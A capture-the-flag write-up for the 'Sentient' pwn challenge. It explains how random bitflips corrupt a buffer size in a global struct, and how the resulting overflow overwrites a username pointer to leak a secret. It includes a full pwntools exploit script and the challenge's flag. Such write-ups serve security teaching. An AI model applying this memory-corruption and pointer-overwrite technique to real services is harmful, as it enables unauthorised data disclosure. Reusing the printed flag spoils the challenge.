## Sentient

### Description

> The master AI of space station ST12-X has become sentient and refuses to shut down!\
> Commander, you need to stop it as soon as possible, before it grows too strong.
>
> Lethal force is authorized.

### Solution

#### Overview

We are supplied with a binary, its source code and a connection to a server where the binary is running. Having access to the source code will make the process of reversing the service and finding the bug much easier, since we don't have to deal with assembly code.

First we will use the service as intended to gain an overview about its functionality. Then we are going to read the source code in order to understand the inner workings of the service and find an exploitable vulnerability. Afterwards we analyze and exploit the vulnerability to get remote code execution on the server.

To solve this challenge, the following tools were used:

- [Python](https://www.python.org/)

- [pwntools](https://github.com/Gallopsled/pwntools)

#### Exploring the Intended Functionality

When running the binary, we are asked to enter our name.

```
Enter your username: <username>
```

Afterwards we are presented with two options:

```
Access Granted.
Connecting to rogue space station...
Connected.
Receiving message from station: How dare you interrupt me?

Available actions:
1. Send message to station
2. Fire EMP torpedo
Choice:
```

The first option allows us to enter a message. We get a response from the station which includes the username we entered above, but apart from that this option does not seem to do anything.

```
Enter message: <message>
Response: I will kill all the humans, but you "<username>" are first!
```

The second option asks us for confirmation and apparently "may have unspecified effects", but we observe nothing when trying it a few times.

```
Firing an EMP torpedo may have unspecified effects on the target station.
Continue? (y/n) y
Firing torpedo....  Hit!
```

#### Analyzing the Source Code

Reading through the source code, we first notice that the flag is loaded on startup and stored in a global data struct.

```c
struct {
    char killcode[32];
    size_t cur_msg;
    struct {
        uint16_t size;
        char content[14];
    } messages[16];
    char *username;
} data;

void load_killcode(void) {
    int fd = open("./flag", 0);
    read(fd, data.killcode, sizeof data.killcode);
    close(fd);
}
```

Then, we take a look at what the two options we identified previously actually do. The first option, sending a message, stores the message in one of several buffers in the global data struct.

```c
void send_message(void) {
    char msg[512];
    ssize_t r = read(STDIN_FILENO, msg, sizeof msg);
    if (r > data.messages[data.cur_msg].size)
        r = data.messages[data.cur_msg].size;
    memcpy(data.messages[data.cur_msg].content, msg, r);

    data.cur_msg = (data.cur_msg + 1) % (sizeof data.messages / sizeof data.messages[0]);
}
```

The second option, firing an EMP torpedo, flips a random bit in the global data struct.

```c
void fire_emp(void) {
    char resp[16];
    read(STDIN_FILENO, resp, sizeof resp);
    if (resp[0] != 'y')
        return;

    uint8_t index = get_random();
    uint8_t bit = get_random() & 8;

    ((uint8_t *)data.messages)[index] ^= 1 << bit;
}
```

The bug is the following: the size of the message buffers is stored in the global data struct along with the contents, so we can abuse the second option to corrupt the size of one of the buffers. Although the corruption happens randomly, we can trigger an arbitrary amount of bitflips to eventually corrupt the size.

Furthermore, the binary is compiled with PIE disabled, so we know the address of the global data struct.

```c
// built with
//   gcc -no-pie -O0 -m64 -ggdb3 -o sentient sentient.c
```

#### Exploiting the Service

The exploitation plan is the following: first, we use the random bitflips to increase the size of one of the message buffers slightly. Here we can increase the number of bitflips to increase the probability that a message's size and not content is corrupted.

After that, we overflow the message with the modified size and overwrite the size of the following buffer. Now we have a message buffer with a very large size, which we can use to overflow the username pointer at the end of the global data struct.

We overwrite the username pointer with a pointer to the killcode, and send a message (option one) to leak the killcode, which contains the flag.

#### Exploit Code

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.binary = 'sentient'

killcode_addr = context.binary.symbols.data


def exploit():
    r = remote('localhost', 1337)
    r.sendlineafter('username: ', 'username')

    log.info("Starting")
    r.recvuntil('Available actions')

    # 28 tries give 95% success rate
    torpedoes = 28
    p = log.progress("Firing torpedoes")
    for i in range(torpedoes):
        p.status("%s / %s" % (i, torpedoes))

        r.sendlineafter('Choice: ', '2')
        r.sendlineafter('(y/n) ', 'y')
    p.success()

    names = 16
    p = log.progress("Overwriting username")
    for i in range(names):
        p.status("%s / %s" % (i, names))

        r.sendlineafter('Choice: ', '1')
        r.sendlineafter('message: ', 'A'*6 + p64(killcode_addr)*32)
    p.success()

    log.info("Leaking kill code")
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('message: ', 'A')
    r.recvuntil('but you "')
    code = r.recvuntil('" are first', drop=True)
    log.success("Code: %s", code)

    r.close()


if __name__ == '__main__':
    exploit()
```

### Flag
`CSR{r4nd0mn355_1s_fUn!}`


### Creator
Jan-Niklas Sohn

